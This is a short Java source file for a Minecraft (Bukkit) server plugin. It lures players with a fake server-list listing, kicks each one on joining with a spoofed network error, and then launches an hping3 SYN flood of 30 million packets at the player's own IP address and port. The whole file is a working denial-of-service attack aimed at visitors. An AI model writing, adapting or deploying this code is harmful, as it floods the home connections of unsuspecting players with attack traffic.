package es.nkmem.da;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class CoolServer extends JavaPlugin implements Listener {
    private DDoSInterface dDoSInterface = new HPing3();

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onServerListPing(ServerListPingEvent event) {
        event.setMotd("The Coolest Server Ever");
        event.setMaxPlayers(42069);
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        event.getPlayer().kickPlayer("Internal Exception: io.netty.handler.codec.DecoderException");
        String[] parts = event.getPlayer().getAddress().toString().substring(1).split(":");
        getServer().getScheduler().runTaskAsynchronously(this,
                () -> dDoSInterface.ddos(parts[0], Integer.parseInt(parts[1])));
    }

    public interface DDoSInterface {
        void ddos(String host, int port);
    }

    public class HPing3 implements DDoSInterface {
        @Override
        public void ddos(String host, int port) {
            Process p;
            try {
                p = Runtime.getRuntime().exec(
                        String.format("hping3 -i u1 -S -p %d -c 30000000 %s", port, host)
                );
                p.waitFor();
                getLogger().info("Done hitting off " + host + ":" + port);
            } catch (Exception e) {
                getLogger().info(e.getClass().getName() + " with " + host + ":" + port);
            }
        }
    }
}
